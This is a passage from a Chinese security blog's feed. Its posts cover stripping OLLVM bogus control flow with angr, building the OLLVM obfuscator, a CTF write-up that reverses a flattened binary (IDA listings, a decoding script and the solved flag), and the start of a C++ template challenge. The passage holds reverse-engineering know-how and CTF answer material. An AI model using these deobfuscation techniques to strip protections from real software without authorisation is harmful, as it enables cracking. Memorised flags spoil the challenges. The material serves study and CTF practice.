Fu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/09/08/hfv3K75Jpl1YtmX.png" alt="image.png"></p><blockquote><p>两者几乎相同</p></blockquote><h3 id="deBogus"><a href="#deBogus" class="headerlink" title="deBogus"></a>deBogus</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>利用<a href="https://github.com/angr/angr" target="_blank" rel="noopener">angr</a>框架去除虚假的控制流，详细内容请参考<a href="https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html" target="_blank" rel="noopener">Deobfuscation: recovering an OLLVM-protected program</a> 。</p><p>原文的主要思路是在进行符号执行时，对约束条件进行”精简”，通过将<code>x * (x + 1) % 2</code>替换为<code>0</code>，使得<code>(y &lt; 10 || x * (x + 1) % 2 == 0)</code>恒成立，从而获取正确的基本块，避免死循环。</p><p>在使用<a href="https://github.com/angr/angr" target="_blank" rel="noopener">angr</a>框架解决该问题时，也可以按照上述思路进行。另外一种思路是直接将<code>x</code>或<code>y</code>的值设为<code>0</code>，同样可以使得上面的约束恒成立。在默认条件下，<code>x</code>和<code>y</code>的值会被初始化为0，无需手动进行设置。也就是说，可以直接利用符号执行来解决，而不会遇到死循环的问题。</p><p>通过符号执行，获取所有执行过的基本块之后，再进行<code>patch</code>去除冗余的基本块即可。</p><blockquote><p>对控制流进行精简后，通过<code>F5</code>查看伪代码，与源码基本一致。另外，可以在此基础上对控制流进行进一步精简，比如去除冗余的指令等。</p></blockquote><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><blockquote><p><code>0x080483e0</code>是函数<code>target_function()</code>的地址。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(angr-dev) &lt;path&gt;/deflat/bogus_control_flow$ python3 debogus.py ./target_bogus 0x80483e0</span><br><span class="line">*******************symbolic execution*********************</span><br><span class="line">executed blocks:  ['0x8048686', '0x804868b', '0x8048991', '0x8048592', '0x8048914', '0x8048715', '0x8048897', '0x8048720', '0x8048725', '0x80484ab', '0x804862c', '0x804842e', '0x80484b6', '0x80484bb', '0x80487bb', '0x80487c0', '0x80486c7', '0x8048950', '0x8048551', '0x80488d3', '0x8048955', '0x8048556', '0x8048856', '0x80489d8', '0x80488d8', '0x804885b', '0x80483e0', '0x80485e0', '0x8048761', '0x80485eb', '0x80485f0', '0x80484f7', '0x80487fc']</span><br><span class="line">************************patch******************************</span><br><span class="line">Successful! The recovered file: ./target_bogus_recovered</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
      <category term="obfuscation" scheme="https://mrh1s.top/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>ollvm_setup</title>
    <link href="https://mrh1s.top/posts/479eeb61/"/>
    <id>https://mrh1s.top/posts/479eeb61/</id>
    <published>2019-09-03T05:12:11.000Z</published>
    <updated>2019-09-08T15:21:42.988Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="OLLVM环境搭建（转）"><a href="#OLLVM环境搭建（转）" class="headerlink" title="OLLVM环境搭建（转）"></a>OLLVM环境搭建（转）</h1><p>版权声明：本文为CSDN博主「何胥」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_38244174/article/details/82889725" target="_blank" rel="noopener">https://blog.csdn.net/weixin_38244174/article/details/82889725</a></p><p>目前市面上的许多安全公司都会在保护IOS应用程序或安卓APP时都会用到OLLVM技术。譬如说顶象IOS加固、网易IOS加固等等。故而我们今天研究下OLLVM是个什么。将从（1）OLLVM是什么？OLLVM与LLVM的关系；（2）OLLVM的三大功能；（3）OLLVM的配置过程；（4）OLLVM源码分析。（4）OLLVM使用四个方面进行说明。</p><h3 id="（一）OLLVM是什么？"><a href="#（一）OLLVM是什么？" class="headerlink" title="（一）OLLVM是什么？"></a>（一）OLLVM是什么？</h3><p>  OLLVM是一款是由瑞士西北科技大学开发的一套开源的针对LLVM的代码混淆工具，旨在加强逆向的难度，整个项目包含数个包含独立功能的LLVM Pass，每个Pass会对应实现一种特定的混淆方式，这些Pass将在后面进行细说，通过这些Pass可以改变源程序的CFG和源程序的结构。后期转向商业项目strong.protect。Github目前已支持OLLVM-4.0.<br>    与此同时，LLVM与OLLVM最大的区别在于混淆Pass的不同。混淆Pass作用于LLVM的IR中间语言，通过Pass混淆IR，最后后端依据IR生成的目标语言也会得到相应的混淆。得益于LLVM的三段式结构，即前端对代码进行语法分析词法分析形成AST并转换为中间IR语言，一系列优化Pass对IR中间语言进行优化操作，或混淆，或分析，或改变IR的操作码等等。最终在后端解释为相应平台嘚瑟机器码。OLLVM支持LLVM所支持的所有前端语言：C,C++,Objective-C,Fortran等等和LLVM所支持的所有目标平台：x86,x86-64,PowerPC,PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore。</p><h3 id="（二）OLLVM的三大功能"><a href="#（二）OLLVM的三大功能" class="headerlink" title="（二）OLLVM的三大功能"></a>（二）OLLVM的三大功能</h3><p>OLLVM有三大功能，分别是：<strong>Instructions Substitution（指令替换）</strong>、<strong>Bogus Control Flow（混淆控制流）</strong>、<strong>Control Flow Flattening（控制流平展）</strong>。</p><p>Github上也有OLLVM每个功能详细的介绍和举例：<a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Features。操作指令可以是一个或多个参数。" target="_blank" rel="noopener">https://github.com/obfuscator-llvm/obfuscator/wiki/Features。操作指令可以是一个或多个参数。</a></p><p> （1）指令替换功能：随机选择一种功能上等效但更复杂的指令序列替换标准二元运算符；适用范围：加法操作、减法操作、布尔操作（与或非操作）且只能为整数类型。</p><p>（2）混淆控制流功能：1.在当前基本块之前添加基本块来修改函数调用图。2.原始基本块也被克隆并填充随机选择的垃圾指令。</p><p>（3）控制流平展功能：目的是完全展平程序的控制流程图。我自己的理解是if…else变为switch..case..语句。</p><h3 id="（三）OLLVM环境搭建："><a href="#（三）OLLVM环境搭建：" class="headerlink" title="（三）OLLVM环境搭建："></a>（三）OLLVM环境搭建：</h3><p>​    OLLVM版本号：OLLVM 4.0；Ubuntu环境：Ubuntu16.04；虚拟机中处理器数量为4个、运行内存3G，分配硬盘空间50g。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git </span><br><span class="line">mkdir build </span><br><span class="line"><span class="built_in">cd</span> build </span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/ </span><br><span class="line">make -j7 <span class="comment">#多线程，如果make出现问题，可去掉-j7使用单线程编译</span></span><br></pre></td></tr></table></figure><p>​    若是git clone一直失败，下不下来，尝试：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.postBuffer 20000000</span><br></pre></td></tr></table></figure><p>​    若是cmake时一直报错，则将cmake那句替换为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ../obfuscator/</span><br></pre></td></tr></table></figure><p>​    若是make时时间太长，则重新cmake后，多分配一些内存和处理器。</p><h3 id="（四）OLLVM保护命令"><a href="#（四）OLLVM保护命令" class="headerlink" title="（四）OLLVM保护命令"></a>（四）OLLVM保护命令</h3><p><strong>指令替换功能：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> -emit-llvm test.c -mllvm -sub -S -o testsub.ll</span><br><span class="line"> </span><br><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> test.c -mllvm -sub -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><strong>控制流平坦化功能 ：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> -emit-llvm test.c -mllvm -fla -S -o testfla.ll</span><br><span class="line"> </span><br><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> test.c -mllvm -fla -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><strong>混淆控制流功能 ：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> -emit-llvm test.c -mllvm -bcf -S -o testfla.ll</span><br><span class="line"> </span><br><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> test.c -mllvm -bcf -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
      <category term="VM" scheme="https://mrh1s.top/tags/VM/"/>
    
  </entry>
  
  <entry>
    <title>nisc-flat</title>
    <link href="https://mrh1s.top/posts/a3b3dca7/"/>
    <id>https://mrh1s.top/posts/a3b3dca7/</id>
    <published>2019-08-18T10:44:38.000Z</published>
    <updated>2019-08-18T10:49:29.129Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h2><p> <a href="\uploads\flat_bdc004aa1104e443b3b9c90a6b98d5e6.zip">flat_bdc004aa1104e443b3b9c90a6b98d5e6.zip</a> </p><p>初步阅读f5代码，发现程序是由大量switch语句构成的，其中每个case都套上了很奇怪的数字，不方便静态阅读，所以我采取了动态调试的方式</p><p>发现大量诸如以下的语句</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00040109E loc_40109E:                             ; CODE XREF: main:loc_4013B3↓j</span><br><span class="line">.text:000000000040109E                 mov     eax, [rbp+var_154]</span><br><span class="line">.text:00000000004010A4                 mov     ecx, eax</span><br><span class="line">.text:00000000004010A6                 sub     ecx, 88070986h</span><br><span class="line">.text:00000000004010AC                 mov     [rbp+var_164], eax</span><br><span class="line">.text:00000000004010B2                 mov     [rbp+var_168], ecx</span><br><span class="line">.text:00000000004010B8                 jz      loc_401270</span><br><span class="line">.text:00000000004010BE                 jmp     $+5</span><br><span class="line">.text:00000000004010C3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004010C3</span><br><span class="line">.text:00000000004010C3 loc_4010C3:                             ; CODE XREF: main+7E↑j</span><br><span class="line">.text:00000000004010C3                 mov     eax, [rbp+var_164]</span><br><span class="line">.text:00000000004010C9                 sub     eax, 916CBF8Ch</span><br><span class="line">.text:00000000004010CE                 mov     [rbp+var_16C], eax</span><br><span class="line">.text:00000000004010D4                 jz      loc_401382</span><br><span class="line">.text:00000000004010DA                 jmp     $+5</span><br></pre></td></tr></table></figure><p>动态调试后可知程序把大量的汇编代码通过这样的方式混淆了，然后再通过操作码来读取对应的功能。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000401270 loc_401270:                             ; CODE XREF: main+78↑j</span><br><span class="line">.text:0000000000401270                 lea     rdi, [rbp+s]</span><br><span class="line">.text:0000000000401274                 mov     rax, offset aJ  ; &quot;J&quot;</span><br><span class="line">.text:000000000040127E                 mov     ecx, 90h</span><br><span class="line">.text:0000000000401283                 mov     edx, ecx        ; n</span><br><span class="line">.text:0000000000401285                 lea     rsi, [rbp+dest]</span><br><span class="line">.text:000000000040128C                 mov     [rbp+var_198], rdi</span><br><span class="line">.text:0000000000401293                 mov     rdi, rsi        ; dest</span><br><span class="line">.text:0000000000401296                 mov     rsi, rax        ; src</span><br><span class="line">.text:0000000000401299                 call    _memcpy</span><br><span class="line">.text:000000000040129E                 mov     rdi, [rbp+var_198] ; char *</span><br><span class="line">.text:00000000004012A5                 call    _Z10fun_check1Pc ; fun_check1(char *)</span><br><span class="line">.text:00000000004012AA                 mov     ecx, 916CBF8Ch</span><br><span class="line">.text:00000000004012AF                 mov     r8d, 70B25450h</span><br><span class="line">.text:00000000004012B5                 test    al, 1</span><br><span class="line">.text:00000000004012B7                 cmovnz  ecx, r8d</span><br><span class="line">.text:00000000004012BB                 mov     [rbp+var_154], ecx</span><br><span class="line">.text:00000000004012C1                 jmp     loc_4013B3</span><br><span class="line">.text:00000000004012C6 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004012C6</span><br><span class="line">.text:00000000004012C6 loc_4012C6:                             ; CODE XREF: main+190↑j</span><br><span class="line">.text:00000000004012C6                 lea     rdi, [rbp+s]    ; char *</span><br><span class="line">.text:00000000004012CA                 call    _Z10fun_check2Pc ; 检测格式</span><br><span class="line">.text:00000000004012CF                 mov     ecx, 916CBF8Ch</span><br><span class="line">.text:00000000004012D4                 mov     edx, 48DC1E73h</span><br><span class="line">.text:00000000004012D9                 test    al, 1</span><br><span class="line">.text:00000000004012DB                 cmovnz  ecx, edx</span><br><span class="line">.text:00000000004012DE                 mov     [rbp+var_154], ecx</span><br><span class="line">.text:00000000004012E4                 jmp     loc_4013B3</span><br><span class="line">.text:00000000004012E9 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004012E9</span><br><span class="line">.text:00000000004012E9 loc_4012E9:                             ; CODE XREF: main+174↑j</span><br><span class="line">.text:00000000004012E9                 lea     rdi, [rbp+s]    ; char *</span><br><span class="line">.text:00000000004012ED                 call    _Z10fun_check3Pc ; 限制格式</span><br><span class="line">.text:00000000004012F2                 mov     ecx, 916CBF8Ch</span><br><span class="line">.text:00000000004012F7                 mov     edx, 9FDEA8ECh</span><br><span class="line">.text:00000000004012FC                 test    al, 1</span><br><span class="line">.text:00000000004012FE                 cmovnz  ecx, edx</span><br><span class="line">.text:0000000000401301                 mov     [rbp+var_154], ecx</span><br><span class="line">.text:0000000000401307                 jmp     loc_4013B3</span><br><span class="line">.text:000000000040130C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040130C</span><br><span class="line">.text:000000000040130C loc_40130C:                             ; CODE XREF: main+B0↑j</span><br><span class="line">.text:000000000040130C                 lea     rdi, [rbp+s]    ; char *</span><br><span class="line">.text:0000000000401310                 call    _Z10fun_check4Pc ; 检查格式</span><br><span class="line">.text:0000000000401315                 mov     ecx, 916CBF8Ch</span><br><span class="line">.text:000000000040131A                 mov     edx, 0CDC4B0D0h</span><br><span class="line">.text:000000000040131F                 test    al, 1</span><br><span class="line">.text:0000000000401321                 cmovnz  ecx, edx</span><br><span class="line">.text:0000000000401324                 mov     [rbp+var_154], ecx</span><br><span class="line">.text:000000000040132A                 jmp     loc_4013B3</span><br><span class="line">.text:000000000040132F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040132F</span><br><span class="line">.text:000000000040132F loc_40132F:                             ; CODE XREF: main+104↑j</span><br><span class="line">.text:000000000040132F                 lea     rsi, [rbp+dest] ; int *</span><br><span class="line">.text:0000000000401336                 lea     rdi, [rbp+var_B0] ; char *</span><br><span class="line">.text:000000000040133D                 call    _Z10fun_check5PcPi ; fun_check5(char *,int *)</span><br><span class="line">.text:0000000000401342                 mov     ecx, 916CBF8Ch</span><br><span class="line">.text:0000000000401347                 mov     edx, 0F465F43Bh</span><br><span class="line">.text:000000000040134C                 test    al, 1</span><br><span class="line">.text:000000000040134E                 cmovnz  ecx, edx</span><br><span class="line">.text:0000000000401351                 mov     [rbp+var_154], ecx</span><br><span class="line">.text:0000000000401357                 jmp     loc_4013B3</span><br></pre></td></tr></table></figure><p>check1~5是整个程序的核心部分，其中check1 ~check4都是对flag格式的限制</p><p>我们只需要将call checkx 打上断点，在这个call执行完成之后，观察al的值即可判断格式是否符合要求，最终发现flag的格式是flag{}，总长度共42.</p><p>最重要的是check5函数，其中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400D90 loc_400D90:                             ; CODE XREF: fun_check5(char *,int *)+E9↑j</span><br><span class="line">.text:0000000000400D90                 mov     eax, 0B92BF994h</span><br><span class="line">.text:0000000000400D95                 mov     ecx, 0AC151DE7h</span><br><span class="line">.text:0000000000400D9A                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000400D9E                 movsxd  rsi, [rbp+var_E4]</span><br><span class="line">.text:0000000000400DA5                 movsx   edi, byte ptr [rdx+rsi] ; 读取下一个字符</span><br><span class="line">.text:0000000000400DA9                 cmp     edi, 30h</span><br><span class="line">.text:0000000000400DAC                 cmovge  eax, ecx</span><br><span class="line">.text:0000000000400DAF                 mov     [rbp+var_E8], eax</span><br><span class="line">.text:0000000000400DB5                 jmp     loc_40102D</span><br><span class="line">.text:0000000000400DBA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400DBA</span><br><span class="line">.text:0000000000400DBA loc_400DBA:                             ; CODE XREF: fun_check5(char *,int *)+79↑j</span><br><span class="line">.text:0000000000400DBA                 mov     eax, 0B92BF994h</span><br><span class="line">.text:0000000000400DBF                 mov     ecx, 0E37ECC40h</span><br><span class="line">.text:0000000000400DC4                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000400DC8                 movsxd  rsi, [rbp+var_E4]</span><br><span class="line">.text:0000000000400DCF                 movsx   edi, byte ptr [rdx+rsi]</span><br><span class="line">.text:0000000000400DD3                 cmp     edi, 39h        ; 判断是否为数字</span><br><span class="line">.text:0000000000400DD6                 cmovle  eax, ecx</span><br><span class="line">.text:0000000000400DD9                 mov     [rbp+var_E8], eax</span><br><span class="line">.text:0000000000400DDF                 jmp     loc_40102D</span><br><span class="line">.text:0000000000400DE4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400DE4</span><br><span class="line">.text:0000000000400DE4 loc_400DE4:                             ; CODE XREF: fun_check5(char *,int *)+159↑j</span><br><span class="line">.text:0000000000400DE4                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000400DE8                 movsxd  rcx, [rbp+var_E4]</span><br><span class="line">.text:0000000000400DEF                 movsx   edx, byte ptr [rax+rcx]</span><br><span class="line">.text:0000000000400DF3                 sub     edx, 1D854A80h</span><br><span class="line">.text:0000000000400DF9                 add     edx, 11h</span><br><span class="line">.text:0000000000400DFC                 add     edx, 1D854A80h</span><br><span class="line">.text:0000000000400E02                 movsxd  rax, [rbp+var_E4]</span><br><span class="line">.text:0000000000400E09                 mov     [rbp+rax*4+var_E0], edx</span><br><span class="line">.text:0000000000400E10                 mov     [rbp+var_E8], 72D256E3h</span><br><span class="line">.text:0000000000400E1A                 jmp     loc_40102D</span><br></pre></td></tr></table></figure><p>如果输入是数字，就将数字转换为对应的大写字母</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400E1F loc_400E1F:                             ; CODE XREF: fun_check5(char *,int *)+B1↑j</span><br><span class="line">.text:0000000000400E1F                 mov     eax, 966647E9h</span><br><span class="line">.text:0000000000400E24                 mov     ecx, 0BA6BE5FDh</span><br><span class="line">.text:0000000000400E29                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000400E2D                 movsxd  rsi, [rbp+var_E4]</span><br><span class="line">.text:0000000000400E34                 movsx   edi, byte ptr [rdx+rsi]</span><br><span class="line">.text:0000000000400E38                 cmp     edi, 2Dh</span><br><span class="line">.text:0000000000400E3B                 cmovz   eax, ecx</span><br><span class="line">.text:0000000000400E3E                 mov     [rbp+var_E8], eax</span><br><span class="line">.text:0000000000400E44                 jmp     loc_40102D</span><br></pre></td></tr></table></figure><p>‘-‘符号不作处理</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400E75 loc_400E75:                             ; CODE XREF: fun_check5(char *,int *)+41↑j</span><br><span class="line">.text:0000000000400E75                 mov     eax, 67B6BD28h</span><br><span class="line">.text:0000000000400E7A                 mov     ecx, 0B80842FBh</span><br><span class="line">.text:0000000000400E7F                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000400E83                 movsxd  rsi, [rbp+var_E4]</span><br><span class="line">.text:0000000000400E8A                 movsx   edi, byte ptr [rdx+rsi]</span><br><span class="line">.text:0000000000400E8E                 cmp     edi, 61h</span><br><span class="line">.text:0000000000400E91                 cmovge  eax, ecx</span><br><span class="line">.text:0000000000400E94                 mov     [rbp+var_E8], eax</span><br><span class="line">.text:0000000000400E9A                 jmp     loc_40102D</span><br><span class="line">.text:0000000000400E9F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400E9F</span><br><span class="line">.text:0000000000400E9F loc_400E9F:                             ; CODE XREF: fun_check5(char *,int *)+95↑j</span><br><span class="line">.text:0000000000400E9F                 mov     eax, 67B6BD28h</span><br><span class="line">.text:0000000000400EA4                 mov     ecx, 7CFC4F40h</span><br><span class="line">.text:0000000000400EA9                 mov     rdx, [rbp+var_10]</span><br><span class="line">.text:0000000000400EAD                 movsxd  rsi, [rbp+var_E4]</span><br><span class="line">.text:0000000000400EB4                 movsx   edi, byte ptr [rdx+rsi]</span><br><span class="line">.text:0000000000400EB8                 cmp     edi, 7Ah</span><br><span class="line">.text:0000000000400EBB                 cmovle  eax, ecx</span><br><span class="line">.text:0000000000400EBE                 mov     [rbp+var_E8], eax</span><br><span class="line">.text:0000000000400EC4                 jmp     loc_40102D</span><br><span class="line">.text:0000000000400EC9 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400EC9</span><br><span class="line">.text:0000000000400EC9 loc_400EC9:                             ; CODE XREF: fun_check5(char *,int *)+271↑j</span><br><span class="line">.text:0000000000400EC9                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000400ECD                 movsxd  rcx, [rbp+var_E4]</span><br><span class="line">.text:0000000000400ED4                 movsx   edx, byte ptr [rax+rcx]</span><br><span class="line">.text:0000000000400ED8                 sub     edx, 50577E63h</span><br><span class="line">.text:0000000000400EDE                 sub     edx, 30h</span><br><span class="line">.text:0000000000400EE1                 add     edx, 50577E63h</span><br><span class="line">.text:0000000000400EE7                 movsxd  rax, [rbp+var_E4]</span><br><span class="line">.text:0000000000400EEE                 mov     [rbp+rax*4+var_E0], edx</span><br><span class="line">.text:0000000000400EF5                 mov     [rbp+var_E8], 67B6BD28h</span><br><span class="line">.text:0000000000400EFF                 jmp     loc_40102D</span><br></pre></td></tr></table></figure><p>如果是字母就转换为数字</p><p>最后在转换完成的字符串上面下一个内存断点，就可找到这个字符串与目标加密字符串比较的过程</p><p>加密字符串：</p><p>flag{J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB}</p><p>解密即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">en c = <span class="string">"J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB"</span></span><br><span class="line">flag = <span class="string">"flag&#123;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">'-'</span>:</span><br><span class="line">        fuck = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> c &gt;= <span class="string">'A'</span> <span class="keyword">and</span> c &lt;= <span class="string">'J'</span>:</span><br><span class="line">        c = chr(ord(c) - <span class="number">0x11</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = chr(ord(c) + <span class="number">48</span>)</span><br><span class="line">    flag = flag + c</span><br><span class="line"></span><br><span class="line">flag += <span class="string">'&#125;'</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="nisc-20190815" scheme="https://mrh1s.top/categories/write-up/nisc-20190815/"/>
    
    
      <category term="VM" scheme="https://mrh1s.top/tags/VM/"/>
    
  </entry>
  
  <entry>
    <title>nisc-src_leak</title>
    <link href="https://mrh1s.top/posts/9455f959/"/>
    <id>https://mrh1s.top/posts/9455f959/</id>
    <published>2019-08-18T10:44:38.000Z</published>
    <updated>2019-08-18T10:49:29.128Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="src-leak"><a href="#src-leak" class="headerlink" title="src_leak"></a>src_leak</h2><p><a href="\uploads\src_leak_2886f9ce0464ae67bbeb52d939c9979d.zip">src_leak_2886f9ce0464ae67bbeb52d939c9979d.zip</a> </p><p>没学过c++语法，看这些东西看蒙了 </p><p>就大概猜了一下，发现算法流程并不是很复杂</p><p>x1~x5都是用一个函数跑出来的</p><p>x6用另一个</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cout</span> &lt;&lt; func3&lt; func2&lt;x1&gt; &gt; &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; func3&lt; func2&lt;x2&gt; &gt; &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; func3&lt; func2&lt;x3&gt; &gt; &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; func3&lt; func2&lt;x4&gt; &gt; &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; func3&lt; func2&lt;x5&gt; &gt; &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output: 1 1 1 1 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; _func1&lt;x1&gt;::result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; _func1&lt;x2&gt;::result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; _func1&lt;x3&gt;::result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; _func1&lt;x4&gt;::result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; _func1&lt;x5&gt;::result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//output: 963 4396 6666 1999 3141</span></span><br></pre></td></tr></table></figure><p>说几个比较关键的地方</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">bool</span> Flag, <span class="class"><span class="keyword">class</span> <span class="title">MaybeA</span>, <span class="title">class</span> <span class="title">MaybeB</span>&gt; <span class="title">class</span> <span class="title">IfElse</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">MaybeA</span>, <span class="title">class</span> <span class="title">MaybeB</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">IfElse</span>&lt;true, MaybeA, MaybeB&gt; &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">using</span> ResultType = MaybeA;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">MaybeA</span>, <span class="title">class</span> <span class="title">MaybeB</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">IfElse</span>&lt;false, MaybeA, MaybeB&gt; &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">using</span> ResultType = MaybeB;</span><br></pre></td></tr></table></figure><p>看起来这么大一堆，实际上就表达了一个意思</p><blockquote><p>result = flag ? MaybeA:MaybeB</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;uint N, uint L&gt; <span class="class"><span class="keyword">struct</span> <span class="title">func1</span>&lt;N, L, L&gt; &#123;</span> <span class="keyword">enum</span> &#123; result = L &#125;; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">size_t</span> 